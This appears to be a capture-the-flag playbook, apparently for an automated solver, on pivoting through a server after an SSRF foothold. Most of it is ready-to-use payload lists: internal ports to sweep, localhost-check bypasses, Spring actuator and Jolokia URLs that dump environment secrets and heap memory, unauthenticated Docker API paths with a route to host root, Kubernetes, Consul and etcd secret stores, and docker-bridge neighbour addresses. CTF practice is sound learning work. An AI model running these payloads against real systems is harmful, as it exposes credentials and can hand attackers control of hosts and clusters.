# Internal pivot — mapping the invisible network

The fetch gets you inside the perimeter; the pivot is knowing what
to ask next. Loopback first, then the container's other ports, then
the subnet.

---

## 1. The loopback inventory — the app's own ports

```text
127.0.0.1:<app-port>          — the app itself — admin/debug routes
                                that listen on all interfaces but are
                                "internal only" by convention
127.0.0.1:<dev-port>           — the dev-server (3000/5000/8000/8080)
127.0.0.1:22                   — ssh-banner — fingerprint
127.0.0.1:6379                 — redis
127.0.0.1:11211                — memcached
127.0.0.1:3306                 — mysql
127.0.0.1:5432                 — postgres
127.0.0.1:27017                — mongo
127.0.0.1:9200                 — elasticsearch — HTTP! JSON!
127.0.0.1:5601                 — kibana
127.0.0.1:2375/2376            — docker-api — containers!
127.0.0.1:2379/2380            — etcd — k8s-config — secrets
127.0.0.1:8500                 — consul — http-api — kv-store
127.0.0.1:8501
127.0.0.1:8086                 — influxdb
127.0.0.1:8080                 — alt-web / proxy / admin
127.0.0.1:3000                 — grafana / node-dev
127.0.0.1:9090                 — prometheus
127.0.0.1:9093                 — alertmanager
127.0.0.1:15672                — rabbitmq-mgmt
127.0.0.1:5672                 — rabbitmq-amqp (binary)
127.0.0.1:5984                 — couchdb — _all_dbs JSON
127.0.0.1:2181                 — zookeeper
127.0.0.1:8025                 — mailhog — mail-inbox!
127.0.0.1:25                   — smtp
127.0.0.1:8888                 — jupyter — notebook-server
127.0.0.1:9000                 — php-fpm (binary) / minio
127.0.0.1:9100                 — node-exporter
127.0.0.1:4040                 — spark-ui
127.0.0.1:5555                 — airflow-flower?
127.0.0.1:5601                 — kibana
127.0.0.1:9411                 — zipkin
127.0.0.1:18080                — spark-history
127.0.0.1:8081                 — spring-actuator / kafka-connect
127.0.0.1:8082                 — kafka-rest
127.0.0.1:8083                 — kafka-connect
127.0.0.1:9042                 — cassandra (binary)
127.0.0.1:7199                 — cassandra-jmx
127.0.0.1:61616                — activemq (binary)
127.0.0.1:8161                 — activemq-admin — http!
127.0.0.1:8089                 — some-apis
127.0.0.1:4444                 — selenium? / metasploit?
127.0.0.1:1099                 — java-rmi (binary)
127.0.0.1:9990                 — wildfly-admin
127.0.0.1:7001                 — weblogic
127.0.0.1:8009                 — ajp — the Ghostcat surface!
127.0.0.1:8005                 — tomcat-shutdown
127.0.0.1:110                  — pop3
127.0.0.1:143                  — imap
127.0.0.1:389                  — ldap
127.0.0.1:636                  — ldaps
127.0.0.1:53                   — dns (udp mostly)
127.0.0.1:161                  — snmp
127.0.0.1:16993                — ?
```

`ssrf_probe --ports` runs the sweep — status/length/elapsed
vs refused-baseline = the open-port map.

## 2. The app's own HTTP routes — loopback-only doors

```text
http://127.0.0.1:<app-port>/admin         — admin-route — bound to
                                            loopback or IP-checked —
                                            SSRF from the server's
                                            own 127.0.0.1 PASSES the
                                            loopback check!
http://127.0.0.1:<app-port>/internal
http://127.0.0.1:<app-port>/debug
http://127.0.0.1:<app-port>/actuator      — spring-actuator!
http://127.0.0.1:<app-port>/actuator/env  — env-vars — FLAG
http://127.0.0.1:<app-port>/actuator/heapdump — memory-dump — flag
http://127.0.0.1:<app-port>/actuator/beans
http://127.0.0.1:<app-port>/actuator/configprops
http://127.0.0.1:<app-port>/actuator/mappings
http://127.0.0.1:<app-port>/actuator/health
http://127.0.0.1:<app-port>/actuator/metrics
http://127.0.0.1:<app-port>/actuator/loggers — change log-level!
http://127.0.0.1:<app-port>/actuator/threaddump
http://127.0.0.1:<app-port>/actuator/jolokia — JMX!
http://127.0.0.1:<app-port>/manage        — some frameworks
http://127.0.0.1:<app-port>/metrics
http://127.0.0.1:<app-port>/health
http://127.0.0.1:<app-port>/status
http://127.0.0.1:<app-port>/console       — h2-console / rails-console /
                                            werkzeug-console!
http://127.0.0.1:<app-port>/.env
http://127.0.0.1:<app-port>/config
http://127.0.0.1:<app-port>/swagger
http://127.0.0.1:<app-port>/api-docs
http://127.0.0.1:<app-port>/graphql       — internal gql
http://127.0.0.1:<app-port>/phpmyadmin
http://127.0.0.1:<app-port>/server-status — apache mod_status
http://127.0.0.1:<app-port>/server-info
http://127.0.0.1:<app-port>/nginx_status
http://127.0.0.1:<app-port>/stub_status
http://127.0.0.1:<app-port>/fpm-status
http://127.0.0.1:<app-port>/wp-admin      — wordpress-admin — the
                                            cookie may not check IP
                                            the way the login does
http://127.0.0.1:<app-port>/flag          — the obvious one
http://localhost:<port>/admin             — the HOSTNAME form —
                                            bypasses naive 127-checks
http://[::1]:<port>/admin                 — ipv6-loopback — the
                                            check may be ipv4-only!
http://0.0.0.0:<port>/admin               — 0.0.0.0-form
http://ip6-localhost/ http://ip6-loopback/
```

The localhost-check the route does (`req.ip == 127.0.0.1`) is
SATISFIED by the server's own fetch — that's the whole point of
loopback-SSRF: the app fetches itself with internal privileges.

## 3. The actuator/jolokia family — the Java goldmine

```text
/actuator/env           — ALL env-vars — DB creds, FLAG, secrets
/actuator/heapdump      — .hprof — memory-dump — grep for flag —
                          can be large — binary — check content-type
/actuator/configprops   — config-properties — secrets inline
/actuator/beans         — bean-inventory — class-names
/actuator/mappings      — route-map — hidden endpoints
/actuator/threaddump    — thread-stacks — data in-flight
/actuator/metrics       — metric names
/actuator/loggers       — POST can set log-levels — write-ish
/jolokia/list           — JMX-inventory — mbean methods —
                          some mbeans run code (reloadByURL etc)
```

`actuator/env` alone solves a big share of Java-SSRF challenges —
the flag is an env-var and Spring dumps all of them.

## 4. The container-world — docker/k8s control planes

```text
http://127.0.0.1:2375/containers/json          — docker-api — list
http://127.0.0.1:2375/containers/<id>/json      — inspect — env!
http://127.0.0.1:2375/containers/<id>/attach?logs=1&stdout=1
http://127.0.0.1:2375/images/json
http://127.0.0.1:2375/version
http://127.0.0.1:2375/info
   — the docker socket on TCP — if exposed unauthenticated →
     container-control → spawn a privileged container → host-root
http+unix://%2fvar%2frun%2fdocker.sock/containers/json
   — the unix-socket variant — curl --unix-socket — if fetcher
     supports it
http://kubernetes.default.svc/api/v1/namespaces
http://kubernetes.default.svc/api/v1/secrets
https://kubernetes.default.svc/api/v1/namespaces/default/secrets
   — needs SA-token — the token file reads via file:// first
```

## 5. The service-discovery planes — consul/etcd/zk

```text
http://127.0.0.1:8500/v1/agent/services        — consul services
http://127.0.0.1:8500/v1/agent/members
http://127.0.0.1:8500/v1/catalog/services
http://127.0.0.1:8500/v1/catalog/nodes
http://127.0.0.1:8500/v1/kv/?recurse           — the KV — secrets!
http://127.0.0.1:8500/v1/kv/flag               — flag-key?
http://127.0.0.1:8500/v1/health/services
http://127.0.0.1:2379/v2/keys/                  — etcd v2 API — list
http://127.0.0.1:2379/v2/keys/?recursive=true   — ALL keys — k8s
                                                  secrets live here!
http://127.0.0.1:2379/v2/keys/flag
http://127.0.0.1:2379/version
http://127.0.0.1:4001/v2/keys/                  — older etcd port
http://127.0.0.1:2181/                           — zk — 4-letter cmds
                                                  via raw TCP (gopher):
                                                  srvr/stat/cons/dump
```

## 6. The data-stores — read what the app reads

```text
http://127.0.0.1:9200/_cat/indices              — es — index-list
http://127.0.0.1:9200/_search?pretty             — dump-docs
http://127.0.0.1:9200/<index>/_search?size=100
http://127.0.0.1:9200/_all/_search?pretty
http://127.0.0.1:9200/_cluster/health
http://127.0.0.1:9200/_cat/aliases
http://127.0.0.1:5984/_all_dbs                   — couchdb
http://127.0.0.1:5984/<db>/_all_docs?include_docs=true
http://127.0.0.1:5984/_utils/
http://127.0.0.1:8086/query?q=show+databases      — influxdb
http://127.0.0.1:8086/query?q=select+*+from+x
http://127.0.0.1:9090/api/v1/query?query=up      — prometheus
http://127.0.0.1:9090/api/v1/targets
http://127.0.0.1:9090/api/v1/label/__name__/values
http://127.0.0.1:15672/api/overview              — rabbitmq-mgmt
http://127.0.0.1:15672/api/queues
http://127.0.0.1:8161/admin/                      — activemq-admin
http://127.0.0.1:8161/admin/queues.jsp
```

HTTP-speaking stores — real JSON you can read — the flags sit in
document/key fields.

## 7. The subnet-sweep — neighbors

```text
1. learn the internal IP — the callback's source-ip or env/hosts
   or /proc/net/fib_trie via file:// → the app's IP
2. sweep neighbors — x.x.x.1 (gateway/router — often a service!),
   x.x.x.2..10 — the docker-bridge layout is predictable:
     172.17.0.1 = docker-host  172.17.0.2+ = containers
     172.18.0.1, 10.0.x.x, 192.168.x.x — compose-networks
3. each open-port → fingerprint → service-specific chain
```

The gateway IP (`.1`) is often the HOST — docker-api on the host,
or the host's own services — reachable because containers share
the bridge.

## 8. The neighbor-pivot table

```text
172.17.0.1      — docker-bridge host — host-services
172.18.0.1      — second docker-net
10.0.2.2        — virtualbox/qemu host
10.0.2.15       — nat-guest default
192.168.65.1    — docker-desktop host
192.168.99.100  — docker-machine
192.168.49.1    — minikube
host.docker.internal — resolves to host on docker-desktop —
                       the NAME reaches the host!
gateway.docker.internal
kubernetes.default.svc — the API
metadata.google.internal — gcp-metadata
```

`host.docker.internal` — resolves to the real host on Docker
Desktop — a NAME that reaches outside the container.

## 9. The port-vs-protocol matrix — what the port likely is

```text
banner-in-response?    → ssh/redis/memcached/smtp — line- or binary-
                         banner — the response shows it — fingerprint
JSON-response?         → es/couch/consul/etcd/k8s/prometheus — REST
html?                  → admin-consoles — jenkins/gitlab/grafana/
                         phpmyadmin/actuator/kibana
timeout-differential?  → open-but-non-http — mysql/pg/mongo — binary
connection-refused?    → closed — next port
empty/silent?          → open-but-silent — redis/memcached tolerate
                         HTTP-verb garbage and answer only valid cmds
```

## 10. The bounded-sweep discipline

```text
- ssrf_probe sweeps a bounded port-list — don't spray /0s — the
  target is a shared instance — 20 well-chosen ports beat 1000
- order: app-port, common-services, then CIDR-neighbors
- record: which ports answered + HOW (banner/json/html/timing)
- every open-port is a hypothesis — fingerprint before chaining
- 25-probe budget — the sweep IS a probe class — the controller
  tracks it
```
